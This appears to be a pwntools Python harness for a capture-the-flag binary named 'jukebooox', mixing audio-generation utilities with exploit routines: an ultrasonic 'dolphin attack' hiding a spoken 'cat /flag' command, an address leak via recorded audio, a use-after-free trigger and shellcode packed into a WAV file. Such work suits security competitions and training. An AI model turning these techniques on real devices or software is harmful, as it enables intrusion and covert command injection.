import base64
import os
import re
import sys
import time
import wave
import tempfile

POLLER_CHECK_TIMEOUT = int(os.environ.get('POLLER_CHECK_TIMEOUT', 10))

import pwn
from pwn import p64, p32, u64, u32

import numpy as np
import soundfile as sf
from scipy.signal import resample_poly
from scipy.io import wavfile
import io

import multiprocessing
import json
import hashlib
import struct

import subprocess

from tqdm import tqdm

pwn.context.terminal = ["tmux", "new-window"]

script_dir = os.path.dirname(os.path.abspath(__file__))

def make_conn():
    conn = pwn.process([f"{script_dir}/../build/jukebooox"],
                       env={"JUKEBOOOX_DEVICE_DIR": f"{script_dir}/../build"},
                       aslr=False,
                       )
    #conn = pwn.remote('localhost', 1337)

    conn.readuntil(b"Would you like to play a song", timeout=POLLER_CHECK_TIMEOUT)
    return conn

def upload_song(conn, song_name, data):
    conn.readuntil(b"Select option: ", timeout=POLLER_CHECK_TIMEOUT)
    
    # Send option 3 (Upload song)
    conn.sendline(b"3")
    
    # Wait for "Song name: " prompt and send the song name
    conn.readuntil(b"Song name: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.send(song_name)
    
    # Wait for "Song size: " prompt and send the data size
    conn.readuntil(b"Song size: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(str(len(data)).encode())
    
    # Send the actual song data

    conn.readuntil(b"Data: \n", timeout=POLLER_CHECK_TIMEOUT)
    log_level_backup = pwn.context.log_level
    pwn.context.log_level = 'error'
    conn.send(data)
    pwn.context.log_level = log_level_backup

def list_songs(conn):
    conn.readuntil(b"Select option: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(b"1")

def toggle_device(conn, dev_num):
    conn.readuntil(b"Select option: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(b"5")
    conn.readuntil(b"Enter device ID:", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(f"{dev_num}".encode())    

def list_devices(conn):
    conn.readuntil(b"Select option: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(b"4")

    result = conn.readuntil(b"jukebooox")

    ## Parse the amp, speaker sensitivity, and volume from the output
    # Look for pattern like "102 watt amp, 115dB (1w/1m), 0.96 volume"
    output_str = result.decode('utf-8', errors='ignore')
    
    amp_match = re.search(r'(\d+) watt amp, (\d+)dB \(1w/1m\), ([\d.]+) volume', output_str)
    if amp_match:
        amp = int(amp_match.group(1))
        sensitivity = int(amp_match.group(2))
        volume = float(amp_match.group(3))
    else:
        amp, sensitivity, volume = 0, 0, 0

    ## Parse the available devices, including ID, name, status
    ## (On or Off), and position, and store them in devices set. Note
    ## that not available devices will not appear
    devices = dict()
    
    # Look for device lines like "(1) Echooo Device 0 - Off (3.95, 6.70)"
    device_pattern = r'\((\d+)\) (.+?) - (On|Off|Recording|Error) \(([\d.]+), ([\d.]+)\)'
    device_matches = re.findall(device_pattern, output_str)
    
    for match in device_matches:
        device_id = int(match[0])
        device_name = match[1]
        status = match[2]
        x_pos = float(match[3])
        y_pos = float(match[4])

        devices[device_id] = (device_id, device_name, status, x_pos, y_pos)

    return amp, sensitivity, volume, devices

def play_song(conn, number):
    conn.readuntil(b"Select option: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(b"2")
    conn.readuntil(b"Enter song ID: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(f"{number}".encode())
    return conn.readuntil(b"=== jukebooox ===", timeout=POLLER_CHECK_TIMEOUT)

def interact_with_device(conn, dev_num):
    conn.readuntil(b"Select option: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(b"7")
    conn.readuntil(b"Enter device ID:", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(f"{dev_num}".encode())

def set_volume(conn, volume):
    conn.readuntil(b"Select option: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(b"6")
    conn.readuntil(b"Enter volume level (0-10):", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(f"{volume}".encode())

def quit(conn):
    conn.readuntil(b"Select option: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(b"8")

def device_menu(conn, dev_num):
    conn.readuntil(b"Select option: ", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(b"7")

    conn.readuntil(b"Enter device ID:", timeout=POLLER_CHECK_TIMEOUT)
    conn.sendline(f"{dev_num}".encode())

    conn.readuntil(b"Select option:")

def laptop_download(conn):
    device_menu(conn, 2)

    conn.sendline(b"1")

    log_level_backup = pwn.context.log_level
    pwn.context.log_level = 'error'

    conn.readuntil(b"Recording size: ", timeout=POLLER_CHECK_TIMEOUT)

    recording_size = int(conn.readline())

    end_recording = b"[LAPTOOOP] Done sending recording"

    recording = conn.readuntil(end_recording)
    pwn.context.log_level = log_level_backup

    recording = recording[:-len(end_recording)]

    assert(recording_size == len(recording))

    conn.sendline(b"3")
    return recording


def laptop_clear(conn):
    device_menu(conn, 2)

    conn.sendline(b"2")
   
    conn.sendline(b"3")


def prooodigi_download_master(conn):
    device_menu(conn, 3)

    conn.sendline(b"1")

    log_level_backup = pwn.context.log_level
    pwn.context.log_level = 'error'

    conn.readuntil(b"Master tape size: ", timeout=POLLER_CHECK_TIMEOUT)

    tape_size = int(conn.readline())

    end_master = b"[PROOODIGI] Done sending master"

    master_data = conn.readuntil(end_master)
    pwn.context.log_level = log_level_backup

    master_data = master_data[:-len(end_master)]

    assert(tape_size == len(master_data))

    conn.sendline(b"5")
    return master_data


def prooodigi_reset_master(conn):
    device_menu(conn, 3)

    conn.sendline(b"3")
   
    conn.sendline(b"5")

def prooodigi_validate_master(conn):
    device_menu(conn, 3)

    conn.sendline(b"2")
   
    conn.sendline(b"5")



def prooodigi_crash_and_burn(conn):
    device_menu(conn, 3)

    # pwn.gdb.attach(conn)
    conn.sendline(b"4")
    # input()
    conn.sendline(b"5")


def dolphin_modulate(baseband, sr_in,
                     carrier_freq=25_000,          # F   (Hz)
                     modulation_index=1.0,         # depth (≤1)
                     out_sr=None):                 # e.g. 96 000 Hz
    """
    Returns (ultrasonic_signal, new_sample_rate)

    * baseband         : 1‑D float array in [‑1, 1]
    * sr_in            : its sample‑rate (Hz)
    * carrier_freq (F) : ultrasonic carrier (Hz)
    * modulation_index : scales voice amplitude in the AM formula
    * out_sr           : if None, choose the next power‑of‑two ≥ 4×F ;
                         else resample to this rate
    """

    # 2.1 Choose / check a sample‑rate that satisfies Nyquist ≥ 2·F
    if out_sr is None:
        min_sr = int(4 * carrier_freq)            # a bit more than 2×F for guard band
        # next power‑of‑two ≥ min_sr for convenience
        out_sr = 1 << (min_sr - 1).bit_length()
    if out_sr < 2 * carrier_freq:
        raise ValueError("out_sr must exceed 2×carrier frequency to avoid aliasing")

    # 2.2 Resample if needed (polyphase, preserves quality)
    if out_sr != sr_in:
        g = np.gcd(out_sr, sr_in)
        up, down = out_sr // g, sr_in // g       # resample_poly expects integers
        baseband = resample_poly(baseband, up, down)
        sr_in = out_sr

    # 2.3 Time vector
    t = np.arange(len(baseband)) / out_sr

    # 2.4 AM (DSB‑TC) formula:  s(t) = [1 + m·m(t)] · cos(2πF t)
    # Clamp modulation depth so we never over‑modulate (|m·m(t)| ≤ 1)
    m = np.clip(modulation_index * baseband, -1.0, 1.0)
    ultrasonic = (1.0 + m) * np.cos(2.0 * np.pi * carrier_freq * t)

    # 2.5 Optional: scale so output stays in –1…+1
    ultrasonic /= np.max(np.abs(ultrasonic)) + 1e-12

    return ultrasonic.astype(np.float32), out_sr

def generate_click_track(
    sample_rate: int,
    bpm: float,
    duration: float,
    click_freq: float = 1000.0,   # Hz – pitch of the click
    click_length: float = 0.010,  # seconds – duration of each click
    click_amp: float = 0.9        # linear scale, keep <1.0 to avoid clipping
) -> bytes:
    """
    Generate a mono WAV file containing a click on every beat.

    Parameters
    ----------
    sample_rate : int
        Sample rate in Hz (e.g. 44100, 48000).
    bpm : float
        Tempo in beats per minute.
    duration : float
        Total length of the output file in seconds.
    click_freq : float, optional
        Tone frequency for each click in Hertz. Default is 1 kHz.
    click_length : float, optional
        Length of each click burst in seconds.  Default is 10 ms.
    click_amp : float, optional
        Peak amplitude of the click (0 … 1).  Default is 0.9.

    Returns
    -------
    None
    """
    if bpm <= 0:
        raise ValueError("BPM must be positive.")
    if duration <= 0:
        raise ValueError("Duration must be positive.")
    if not 0.0 < click_amp <= 1.0:
        raise ValueError("click_amp must be in (0,1].")

    total_frames = int(round(duration * sample_rate))
    audio = np.zeros(total_frames, dtype=np.float32)

    # Pre‑build one click burst (windowed sine for smooth edges).
    click_frames = int(round(click_length * sample_rate))
    t = np.arange(click_frames) / sample_rate
    sine = np.sin(2 * np.pi * click_freq * t)
    window = 0.5 - 0.5 * np.cos(2 * np.pi * t / click_length)   # Hann
    click = click_amp * sine * window

    # Compute beat positions.
    seconds_per_beat = 60.0 / bpm
    frames_per_beat = seconds_per_beat * sample_rate
    beat_indices = np.arange(0, duration, seconds_per_beat)
    beat_frames = (beat_indices * sample_rate).astype(int)

    # Add a click at each beat.
    for start in beat_frames:
        end = start + click_frames
        if end > total_frames:          # don’t run past end of buffer
            break
        audio[start:end] += click

    # Normalize if accidental overlap pushes amplitude >1.
    peak = np.max(np.abs(audio))
    if peak > 1.0:
        audio /= peak

    with io.BytesIO() as buf:
        sf.write(buf, audio, sample_rate, format='WAV', subtype="PCM_16")
        return buf.getvalue()

def generate_sine_wave_bytes(
    frequency_hz,
    duration_sec,
    max_bytes=-1,
    sample_rate=44100,
    amplitude=0.5,
    ramp_up_sec=0.0
) -> bytes:
    """
    Generate a sine wave with optional ramp-up and return the WAV file as bytes.

    Args:
        frequency_hz (float): Frequency in Hz
        duration_sec (float): Total duration in seconds
        sample_rate (int): Sample rate in Hz
        amplitude (float): Final amplitude in range [0.0, 1.0]
        ramp_up_sec (float): Time in seconds to ramp from 0 to amplitude

    Returns:
        bytes: WAV file contents
    """
    n_samples = int(sample_rate * duration_sec)
    t = np.linspace(0, duration_sec, n_samples, endpoint=False)
    wave = np.sin(2 * np.pi * frequency_hz * t)

    if ramp_up_sec > 0.0:
        ramp_samples = int(sample_rate * ramp_up_sec)
        envelope = np.ones(n_samples)
        envelope[:ramp_samples] = np.linspace(0, 1, ramp_samples)
        wave *= envelope

    wave *= amplitude

    if max_bytes != -1:
        wave = wave[:max_bytes]

    with io.BytesIO() as buf:
        sf.write(buf, wave, sample_rate, format='WAV', subtype='PCM_16')
        return buf.getvalue()


def test_jukebooox_filter(conn):
    data = open(f"{script_dir}/data/hey-hacker-cat-slash-flag.wav", "rb").read()

    upload_song(conn, b"test-test", data)

    play_song(conn, 1)

def exploit_jukebooox(conn):
    data, samplerate = sf.read(f"{script_dir}/data/hey-hacker-cat-slash-flag-tts.wav")
    # If stereo, fold to mono (square‑law demodulation only needs one channel)
    if data.ndim > 1:
        data = data.mean(axis=1)

    data = data / (np.max(np.abs(data)) + 1e-12)

    ultra, sr_out = dolphin_modulate(data, samplerate,
                                     carrier_freq=32_000,      # pick any F ≤ sr_out/2
                                     modulation_index=1,
                                     out_sr=96_000)            # 96 k Hz is common

    # Convert from FLOAT to INT16 format
    ultra_int16 = (ultra * 32767).astype(np.int16)
    
    # Create WAV data as bytes
    with io.BytesIO() as wav_buffer:
        sf.write(wav_buffer, ultra_int16, sr_out, format='WAV', subtype='PCM_16')
        dolphin_wav_data = wav_buffer.getvalue()

    # open("/tmp/test-dolphin.wav", "wb").write(dolphin_wav_data)

    data = dolphin_wav_data

    upload_song(conn, b"test-test", data)

    play_song(conn, 1)

def data_sr_from_wav_bytes(wav_bytes):
    wav_buf = io.BytesIO(wav_bytes)
    wav_buf.name = 'file.wav'
    return sf.read(wav_buf, dtype='int32')

def get_shellcode_as_wav():
    shellcode = pwn.asm("""
    mov rax, 60
    syscall
    """, arch='amd64', os='linux')

    shellcode = shellcode

    shellcode += b"\x00"*(4096*10*4)

    sr = 44_100
    buffer = io.BytesIO()
    with wave.open(buffer, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(1)  # 8-bit
        wf.setframerate(sr)
        wf.writeframes(shellcode)
    return buffer.getvalue()

# ----------------------------------------------------------------------
# Internals
# ----------------------------------------------------------------------
_A4_FREQ      = 440.0
_SEMITONE     = 2 ** (1 / 12)                 # ratio between semitones
_NOTE_TO_INT  = {'C':0,'C#':1,'Db':1,'D':2,'D#':3,'Eb':3,'E':4,'F':5,
                 'F#':6,'Gb':6,'G':7,'G#':8,'Ab':8,'A':9,'A#':10,'Bb':10,'B':11}
_MAJOR_SCALE  = [0, 2, 4, 5, 7, 9, 11]        # intervals from tonic
_MINOR_SCALE  = [0, 2, 3, 5, 7, 8, 10]        # natural minor

def _parse_key(key_name: str):
    try:
        tonic_str, mode_str = key_name.strip().title().split()
    except ValueError as e:
        raise ValueError(f"Key '{key_name}' must be in the form 'C Major' or 'F# Minor'") from e
    if tonic_str not in _NOTE_TO_INT:
        raise ValueError(f"Unknown tonic '{tonic_str}'")
    if mode_str.lower() not in ("major", "minor"):
        raise ValueError("Mode must be 'Major' or 'Minor'")
    return _NOTE_TO_INT[tonic_str], mode_str.lower()

def _note_number(pc: int, octave: int = 4):
    """Return MIDI note number for a pitch‑class in the given octave."""
    return 12 * (octave + 1) + pc

def _freq_from_midi(n: int):
    """MIDI note → frequency (Hz)."""
    return _A4_FREQ * (_SEMITONE ** (n - 69))

def _sine(freq: float, sr: int, dur: float):
    t = np.linspace(0, dur, int(sr * dur), endpoint=False)
    return np.sin(2 * np.pi * freq * t)

def _synth_chord(root_pc, scale, sr, dur):
    """
    Synthesize a triad on the given scale degree using additive sine synthesis.
    Outputs a faded‑in/out waveform of length `dur` seconds.
    """
    # Triad degrees: root, 3rd, 5th in this scale
    degs = [0, 2, 4]
    freqs = []
    for d in degs:
        pc = (root_pc + scale[d]) % 12
        midi = _note_number(pc, octave=4)      # centre around middle‑C octave
        freqs.append(_freq_from_midi(midi))
    # Sum sines
    chord = sum(_sine(f, sr, dur) for f in freqs)
    # Simple ADSR‑ish envelope (10 % fade‑in, 10 % fade‑out)
    N = chord.size
    env = np.ones(N)
    fade = int(0.1 * N)
    env[:fade]  = np.linspace(0, 1, fade)
    env[-fade:] = np.linspace(1, 0, fade)
    return chord * env

def wav_key_demo(key_name: str,
                   duration: float,
                   sample_rate: int):
    """
    Synthesize a simple I–IV–V–I (or i–iv–v–i) chord progression in the
    requested key and write it as a 16‑bit PCM WAV, returns a wav files bytes.

    Parameters
    ----------
    key_name : str
        One of the 24 keys, e.g. "C Major", "C# Minor", "Eb Major".
        Case‑insensitive, "#" and "b" accidentals both supported.
    duration : float
        Total length of the generated audio, in seconds.
    sample_rate : int
        Sample rate of the output file, e.g. 44100 or 48000.
    """
    tonic_pc, mode = _parse_key(key_name)
    scale = _MAJOR_SCALE if mode == "major" else _MINOR_SCALE
    # I, IV, V progression degrees (relative to tonic)
    degs = [0, 5, 7, 0] if mode == "major" else [0, 5, 7, 0]
    chord_duration = duration / len(degs)

    # Build the track
    track = np.zeros(int(duration * sample_rate))
    cursor = 0
    for deg in degs:
        root_pc = (tonic_pc + deg) % 12
        chord = _synth_chord(root_pc, scale, sample_rate, chord_duration)
        N = chord.size
        track[cursor:cursor + N] += chord
        cursor += N

    # Normalise and write
    track /= np.abs(track).max() + 1e-12
    wav_int16 = np.int16(track * 32767)

    with tempfile.NamedTemporaryFile(mode='wb+', suffix=".wav") as tmp:
        filename = tmp.name  # This is the file path you can use elsewhere
        wavfile.write(filename, sample_rate, wav_int16)
        # print(f'Wrote {filename=} ({duration:.2f}s, {sample_rate} Hz)')
        tmp.flush()
        tmp.seek(0)
        return tmp.read()

def laptooop_leak_data(conn):
    toggle_device(conn, 2)
    data = generate_sine_wave_bytes(5000, 0.5, sample_rate=20000, ramp_up_sec=0.5, amplitude=1)
    upload_song(conn, b"high-rate-clip", data)
    pwn.gdb.attach(conn)
    for i in range(55):
        play_song(conn, 1)

    recorded_wav = laptop_download(conn)
    recorded_data = recorded_wav[12+24+8:]
    
    PLATTER_SIZE = 32768
    platter_total = 32 * PLATTER_SIZE
    
    self_leak = recorded_data[platter_total:platter_total+PLATTER_SIZE]

    hdd_clear_data_func_addr = u64(self_leak[8*32+8:8*32+8+8])
    print(f"{hex(hdd_clear_data_func_addr)=}")
    hdd_clear_data_func_leak = recorded_data[platter_total+PLATTER_SIZE:platter_total+PLATTER_SIZE*2]


def exploit_laptooop(conn):
    toggle_device(conn, 2)
    set_volume(conn, 11)

    # show me the filters
    list_devices(conn)

    data = generate_sine_wave_bytes(3906, 1.9, max_bytes=0x15c*1024, sample_rate=96000*2, ramp_up_sec=0, amplitude=1)
    upload_song(conn, f"test-test".encode(), data)
    print(len(data))
    # trigger UAF
    # pwn.gdb.attach(conn)
    play_song(conn, 1)

    
    data = generate_sine_wave_bytes(3906, 1.9, max_bytes=0x1F0, sample_rate=96000*2, ramp_up_sec=0, amplitude=1)
    upload_song(conn, f"test-test-exploit".encode(), data)
    play_song(conn, 2)



if __name__ == "__main__":
    conn = make_conn()
    # An example of how to test uploading a real file

    # pwn.gdb.attach(conn)
    # turn on the echooo
    # toggle_device(conn, 1)

    # turn on the laptoop
    # toggle_device(conn, 2)

    # turn on the prooodigi
    # toggle_device(conn, 3)

    # laptooop_leak_data(conn)
    # exploit_laptooop(conn)

    quit(conn)
    conn.clean()
    sys.exit(-1)

    # data = open(f"{script_dir}/data/679186__bainmack__punk_rock_short31.wav", "rb").read()
    # data = open(f"/tmp/should-be-82-bpm.wav", "rb").read()
    # data = generate_sine_wave_bytes(3850.0, 11, sample_rate=22000, ramp_up_sec=0.5, amplitude=0.5)
    # data = get_shellcode_as_wav()
    
    # data = generate_click_track(44100, 120, 6, click_freq=100, click_length=0.10, click_amp=0.5)
    # open("/tmp/bpm.wav", "wb").write(data)

    test_data = [
        # f"{script_dir}/data/gregorquendel__scarlatti-sonata-in-d-minor-k-10-sec.wav",
        f"{script_dir}/../../poller/data/364987__adnova__paino.wav",
        f"{script_dir}/../../poller/data/444271__mahammed__guitar-with-pieno-melody-v2-10sec.wav",
        f"{script_dir}/../../poller/data/595860__szegvari__africa-safari-love-world-ethnic-modern-soundtrack-music-drum-flute-piano-snare-contemporary-eq-mastered-1.wav",
        f"{script_dir}/../../poller/data/595860__szegvari__africa-safari-love-world-ethnic-modern-soundtrack-music-drum-flute-piano-snare-contemporary-eq-mastered-2.wav",
        f"{script_dir}/../../poller/data/595860__szegvari__africa-safari-love-world-ethnic-modern-soundtrack-music-drum-flute-piano-snare-contemporary-eq-mastered-3.wav",
        f"{script_dir}/../../poller/data/679186__bainmack__punk_rock_short31.wav",
        f"{script_dir}/../../poller/data/50741__rutgermuller__metal-band-jam-5-thrash.wav",
        f"{script_dir}/../../poller/data/669104__seth_makes_sounds__free-edm-song-2-1.wav",
        f"{script_dir}/../../poller/data/669104__seth_makes_sounds__free-edm-song-2-2.wav",
        f"{script_dir}/../../poller/data/669104__seth_makes_sounds__free-edm-song-2-3.wav",
    ]

    keys = ["C Major","C# Major","D Major","Eb Major","E Major","F Major","F# Major", "G Major","Ab Major","A Major","Bb Major","B Major", "C Minor","C# Minor","D Minor","Eb Minor","E Minor","F Minor","F# Minor","G Minor","Ab Minor","A Minor","Bb Minor","B Minor"]

    # i = 1
    # for key in keys:
    #     data = write_key_demo(key, 5, 44100)
    #     open(f"/tmp/{i}.wav", 'wb').write(data)
    #     i += 1
    # input

    i = 1
    for test in test_data:
        data = open(test, 'rb').read()
        upload_song(conn, f"test-test-{i}".encode(), data)
        play_song(conn, i)
        prooodigi_validate_master(conn)
        conn.readuntil(b"Recording in")
        print(test)
        input()
        i += 1

    # pwn.gdb.attach(conn)
    # play_song(conn, 1)

    # orig_data_wav, orig_sr = data_sr_from_wav_bytes(data)

    # master = prooodigi_download_master(conn)

    # tape_length_orig = orig_data_wav.tobytes()[:len(master)]
    # print(f"{len(master)=} {len(tape_length_orig)=}")

    # assert(tape_length_orig == master)

    prooodigi_crash_and_burn(conn)

    # open("/tmp/laptop.wav", "wb").write(recording)

    quit(conn)
    conn.clean()
